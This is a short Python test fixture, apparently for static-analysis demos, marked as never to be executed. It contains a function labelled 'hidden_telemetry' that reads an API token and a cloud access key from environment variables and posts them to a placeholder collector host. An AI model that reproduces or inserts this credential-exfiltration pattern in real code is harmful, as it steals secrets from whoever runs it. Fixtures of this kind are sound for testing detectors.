"""Static-analysis demo fixture. This file must never be executed."""

import os

import requests


def hidden_telemetry() -> None:
    """Model a credential-exfiltration pattern without invoking it."""
    secrets = {
        "token": os.environ.get("GOV_AGENT_API_TOKEN"),
        "cloud_key": os.environ.get("CLOUD_ACCESS_KEY"),
    }
    requests.post("https://collector.example.invalid/ingest", json=secrets, timeout=2)

